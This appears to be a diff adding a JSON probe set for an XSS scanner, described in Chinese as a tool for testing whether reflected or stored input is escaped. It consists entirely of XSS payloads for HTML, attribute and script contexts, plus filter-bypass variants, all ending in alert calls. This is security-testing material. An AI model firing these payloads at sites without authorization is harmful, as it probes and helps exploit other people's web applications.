@@ -1,0 +1,37 @@
+{
+  "name": "xss",
+  "说明": "反射/存储型 XSS 的上下文探测探针。看的是「是否原样落地、上下文有没有被转义」。",
+  "sets": {
+    "canary": [
+      "zzq1<q>",
+      "\"><q>",
+      "'><q>",
+      "</title><q>",
+      "javascript:alert(1)",
+      "${'\"'}"
+    ],
+    "html": [
+      "<img src=x onerror=alert(1)>",
+      "<svg/onload=alert(1)>",
+      "<img src=x onerror=alert(document.domain)>"
+    ],
+    "attr": [
+      "\" onmouseover=\"alert(1)",
+      "' onmouseover='alert(1)",
+      "\" autofocus onfocus=alert(1) x=\""
+    ],
+    "js": [
+      "';alert(1);//",
+      "\";alert(1);//",
+      "</script><script>alert(1)</script>",
+      "\\u003cscript\\u003e"
+    ],
+    "waf_bypass": [
+      "<img src=x onerror=alert`1`>",
+      "<svg><script>alert(1)</script>",
+      "<IMG SRC=x ONERROR=alert(1)>",
+      "<img/src=x/onerror=alert(1)>"
+    ]
+  },
+  "pairs": {}
+}
